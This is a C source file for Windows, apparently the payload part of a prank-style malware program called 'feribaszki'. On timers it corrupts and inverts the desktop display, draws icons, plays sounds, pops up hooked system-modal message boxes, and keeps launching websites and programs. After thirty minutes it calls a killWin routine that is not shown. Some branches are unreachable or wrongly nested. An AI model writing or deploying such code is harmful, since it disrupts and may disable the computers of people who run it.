#include "feribaszki.h"



DWORD WINAPI payloadThread(LPVOID parameter) {
	Sleep(5000);

	CreateThread(0, 0, &visualfx, 0, 0, 0);
	Sleep(5000);

	CreateThread(0, 0, &messageWave, 0, 0, 0);
	Sleep(5000);

	CreateThread(0, 0, &soundThread, 0, 0, 0);
	Sleep(5000);

	CreateThread(0, 0, &execute, 0, 0, 0);
	Sleep(5000);
	

	Sleep(1800000);
	killWin();

	return 0;
}
DWORD WINAPI soundThread(LPVOID parameter) {
	int select;
	Sleep(60000);
	for (;;) {
		select = (rand() % 4) + 1;
		if (select == 1) {
			for (int i = 0; i < 1; i++) {
				PlaySoundA(sounds[random() % nSounds], GetModuleHandle(NULL), SND_SYNC);
				Sleep(rand() % 2500);
			}
		}
		if (select == 2) {
			for (int i = 0; i < 1; i++) {
				PlaySoundA(sounds[random() % nSounds], GetModuleHandle(NULL), SND_SYNC);
				Sleep(rand() % 2500);
			}
		}
		if (select == 3) {
			for (int i = 0; i < 1; i++) {
				PlaySoundA(sounds[random() % nSounds], GetModuleHandle(NULL), SND_SYNC);
				Sleep(rand() % 2500);
			}
		}
		if (select == 4) {
			PlaySound(MAKEINTRESOURCE(IDR_WAVE2), (HMODULE)&__ImageBase, SND_SYNC | SND_RESOURCE);
			Sleep(2500);
		}
		if (select == 5) {
			PlaySound(MAKEINTRESOURCE(IDR_WAVE3), (HMODULE)&__ImageBase, SND_SYNC | SND_RESOURCE);
			Sleep(2500);
		}
		if (select == 6) {
			PlaySound(MAKEINTRESOURCE(IDR_WAVE4), (HMODULE)&__ImageBase, SND_SYNC | SND_RESOURCE);
			Sleep(2500);
		}
		Sleep((rand() % 60000) + 30000);
	} 

	return 0;
}
DWORD WINAPI messageWave(LPVOID parameter) {
	Sleep(9000000);
	for (int i = 0; i < 5; i++) {
		CreateThread(0, 0, &messageBoxThread, 0, 0, 0);
		Sleep((rand() % 1800000) + 900000);
	}

	return 0;
}
DWORD WINAPI messageBoxThread(LPVOID parameter) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	MessageBoxA(NULL, (LPCSTR)message[random() % nmessage], "feribaszki", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
	UnhookWindowsHookEx(hook);

	return 0;
}
DWORD WINAPI visualfx(LPVOID parameter) {
	Sleep(900000);

	int fx;
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetDC(hwnd);
	for (;;) {
		fx = (rand() % 6) + 1;
		if (fx == 1) {
			HBRUSH brush = CreateSolidBrush(RGB(255, 0, 0));
			SelectObject(hdc, brush);
			BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, PATINVERT);
			// ReleaseDC(nullptr, hdc);
			PlaySound(MAKEINTRESOURCE(IDR_WAVE2), (HMODULE)&__ImageBase, SND_SYNC | SND_RESOURCE);
			Sleep(5000);
		}
		if (fx == 2) {
			HWND hwnd = GetDesktopWindow();
			HDC hdc = GetWindowDC(hwnd);
			RECT rekt;
			GetWindowRect(hwnd, &rekt);
			for (int i = 0; i < 5; i++) {
				int x1 = rand() % (rekt.right - 100);
				int y1 = rand() % (rekt.bottom - 100);
				int x2 = rand() % (rekt.right - 100);
				int y2 = rand() % (rekt.bottom - 100);
				int width = rand() % 600;
				int height = rand() % 600;

				BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, SRCCOPY);
				Sleep((rand() % 100) + 555);
			}
		}
		if (fx == 3) {
			for (int i = 0; i < 2; i++) {
				BitBlt(hdc, 32, 41, w, h, hdc, 7, 7, 0x999999);
				Sleep(10);
			}
			Sleep(5000);
		}
		if (fx == 4) {
			int randd;
			POINT cursor;
			GetCursorPos(&cursor);
			for (int i = 0; i < 5; i++) {
				randd = (rand() % 4) + 1;
				if (randd == 1) {
					DrawIcon(hdc, cursor.x, cursor.y, LoadIcon(NULL, IDI_ERROR));
				}
				if (randd == 2) {
					DrawIcon(hdc, cursor.x, cursor.y, LoadIcon(NULL, IDI_WARNING));
				}
				if (randd == 3) {
					DrawIcon(hdc, cursor.x, cursor.y, LoadIcon(NULL, IDI_INFORMATION));
				}
				if (randd == 4) {
					DrawIcon(hdc, cursor.x, cursor.y, LoadIcon(NULL, IDI_APPLICATION));
				}
				Sleep(5000);
			}
			if (fx == 5) {
				int ico;
				for (int i = 0; i < 5; i++) {
					ico = (rand() % 5) + 1;
					if (ico == 1) {
						DrawIcon(hdc, rand() % w, rand() % h, LoadIcon(NULL, IDI_WARNING));
					}
					if (ico == 2) {
						DrawIcon(hdc, rand() % w, rand() % h, LoadIcon(NULL, IDI_INFORMATION));
					}
					if (ico == 3) {
						DrawIcon(hdc, rand() % w, rand() % h, LoadIcon(NULL, IDI_QUESTION));
					}
					if (ico == 4) {
						DrawIcon(hdc, rand() % w, rand() % h, LoadIcon(NULL, IDI_ERROR));
					}
					if (ico == 5) {
						DrawIcon(hdc, rand() % w, rand() % h, LoadIcon(NULL, IDI_APPLICATION));
					}
					Sleep(5000);
				}
			}
			if (fx == 6) {
				for (int i = 0; i < 2; i++) {
					HWND hwnd = GetDesktopWindow();
					HDC hdc = GetWindowDC(hwnd);
					RECT rekt;
					GetWindowRect(hwnd, &rekt);
					BitBlt(hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, hdc, 0, 0, NOTSRCCOPY);
					Sleep(5000);
				}
			}
		}
		Sleep((rand() % 60000) + 30000);
	}

	return 0;
}
DWORD WINAPI execute(LPVOID parameter) {
	Sleep(1800000);
	for (;;) {
		if (FindProcess(L"opera.exe")) {
			ShellExecuteA(NULL, "open", (LPCSTR)site[random() % nsite], NULL, NULL, SW_SHOWDEFAULT);
			Sleep(60000);
		}
		if (FindProcess(L"chrome.exe")) {
			ShellExecuteA(NULL, "open", (LPCSTR)site[random() % nsite], NULL, NULL, SW_SHOWDEFAULT);
			Sleep(60000);
		}
		else {
			Sleep(60000);
			ShellExecuteA(NULL, "open", (LPCSTR)prog[random() % nprog], NULL, NULL, SW_SHOWDEFAULT);
		}
		Sleep((rand() % 60000) + 30000);
	}
	
	return 0;
}
